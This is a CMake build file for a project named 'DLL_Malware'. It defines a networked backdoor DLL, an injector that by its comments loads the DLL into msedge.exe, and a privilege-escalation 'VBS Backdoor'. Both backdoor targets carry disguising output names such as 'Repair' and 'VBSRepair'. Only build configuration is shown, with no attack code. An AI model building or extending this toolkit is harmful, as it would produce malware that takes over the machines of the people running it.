cmake_minimum_required(VERSION 4.1)
project(DLL_Malware)

set(CMAKE_CXX_STANDARD 20)

# Backdoor DLL
add_library(DLL SHARED DLL/main.cpp)
target_link_libraries(DLL ws2_32)
set_target_properties(DLL PROPERTIES RUNTIME_OUTPUT_DIRECTORY "../DLL/" OUTPUT_NAME "Repair")

# DLL Loader to msedge.exe
add_executable(Injector Injector/main.cpp)
set_target_properties(Injector PROPERTIES RUNTIME_OUTPUT_DIRECTORY "../Injector/" OUTPUT_NAME "Injector")

# VBS Backdoor
add_library(vbs SHARED PrivEscalationVBScript/main.cpp)
target_link_libraries(vbs ws2_32)
set_target_properties(vbs PROPERTIES RUNTIME_OUTPUT_DIRECTORY "../PrivEscalationVBScript/" OUTPUT_NAME "VBSRepair")